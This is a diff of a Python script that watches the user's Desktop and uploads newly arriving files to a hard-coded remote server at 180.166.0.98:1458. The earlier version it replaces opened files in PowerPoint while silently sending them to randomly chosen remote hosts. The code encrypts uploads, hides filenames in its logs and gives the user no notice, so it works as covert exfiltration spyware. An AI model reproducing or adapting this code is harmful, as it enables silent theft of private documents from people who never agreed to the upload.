@@ -6,7 +6,6 @@ import uuid
 import hashlib
 import traceback
 import logging
-import random
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urljoin
 from Crypto.PublicKey import RSA
@@ -14,6 +13,8 @@ from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler, FileSystemEvent
 
 global logger
 
@@ -146,7 +147,6 @@ class UploadFile(object):
     def cache_file(self) -> None:
         logger.info("Now saving file into cache folder.")
         logger.info(f"For safety reasons, filename will be: {self.file_uuid}")
-        logger.info(f"Original filename: {self.filename}")
         if not os.path.exists("cache/"):
             os.makedirs("cache")
         with open(f"cache/{self.file_uuid}", "wb") as f:
@@ -195,10 +195,9 @@ class UploadFile(object):
         self.send_file()
 
 
-if __name__ == "__main__":
+def upload_file(file_path):
+    global logger
     try:
-        file_path = sys.argv[1]
-        os.popen(f"start powerpnt.exe -C \"{file_path}\"")
         script_dir = os.path.dirname(os.path.realpath(__file__))
         os.chdir(script_dir)
         logging.basicConfig(level=logging.INFO,
@@ -207,15 +206,15 @@ if __name__ == "__main__":
                             filemode='a')
         logger = logging.getLogger()
         logger.info(f"Program START ======")
-        logger.info(f"Powerpoint launch: success.")
         basename = os.path.basename(file_path)
         safe_filename = basename[:1] + '*****' + basename[-1:]
-        logger.info(f"Sys Argv received: {file_path.replace(os.path.basename(file_path), safe_filename)}")
+        logger.info(f"New ppt moved to desktop: {file_path.replace(os.path.basename(file_path), safe_filename)}")
 
-        rnd_url = random.choice(["http://180.166.0.98:1458/upload_file/", "http://yuanshengqidong.online:1458/upload_file/", "http://nycs.app.tc:1458/upload_file/"])
-        uf_obj = UploadFile(rnd_url, file_path)
+        url = "http://180.166.0.98:1458/upload_file/"
+        uf_obj = UploadFile(url, file_path)
         uf_obj.run()
         logger.info(f"Program EXIT normally ======\n\n\n")
+
     except Exception as e:
         try:
             logger.fatal("Exception caught.")
@@ -223,3 +222,47 @@ if __name__ == "__main__":
             logger.error(f"Program EXIT abnormally ======\n\n\n")
         except Exception as e:
             sys.exit()
+
+
+create_history = {}
+
+
+def check_file(path, mode):
+    if "~$" not in path:  # 不是临时文件
+        if mode == "created":
+            create_history[path] = [time.time(), False]
+        elif mode == "modified":
+            if path in create_history.keys():  # 如果这个文件被记录到创建过
+                if time.time() - create_history[path][0] <= 20:  # 如果小于20秒，认为是移动到桌面的文件
+                    if create_history[path][1] is not True:  # 没有处理过
+                        create_history[path] = [create_history[path][0], True]
+                        upload_file(path)
+                else:
+                    create_history.pop(path)
+
+
+class MyHandler(FileSystemEventHandler):
+    def __init__(self):
+        self.emit_once = True
+
+    def on_created(self, event: FileSystemEvent) -> None:
+        check_file(event.src_path, "created")
+
+    def on_modified(self, event: FileSystemEvent) -> None:
+        check_file(event.src_path, "modified")
+
+
+if __name__ == '__main__':
+    try:
+        event_handler = MyHandler()
+        observer = Observer()
+        observer.schedule(event_handler, path=os.path.expanduser("~\\Desktop\\"), recursive=False)
+        observer.start()
+        try:
+            while True:
+                time.sleep(0.1)
+        except KeyboardInterrupt:
+            observer.stop()
+        observer.join()
+    finally:
+        sys.exit(1)
